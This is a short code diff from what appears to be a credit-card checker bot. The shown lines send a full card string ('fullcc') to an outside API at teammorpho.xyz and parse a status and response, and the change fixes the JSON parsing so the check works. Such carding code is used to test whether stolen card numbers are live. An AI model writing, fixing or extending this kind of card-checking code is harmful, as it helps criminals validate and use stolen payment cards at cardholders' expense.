@@ -149,7 +149,7 @@ Retry After {after}s
                                 f"http://teammorpho.xyz/api/strauth.php?lista={fullcc}"
                             )
                             reqone = session.get(authurl)
-                            data = json.loads(reqone)
+                            data = reqone.json()
                             stat = data["status"]
                             ress = data["resp"]
                             fourthresp = f"""
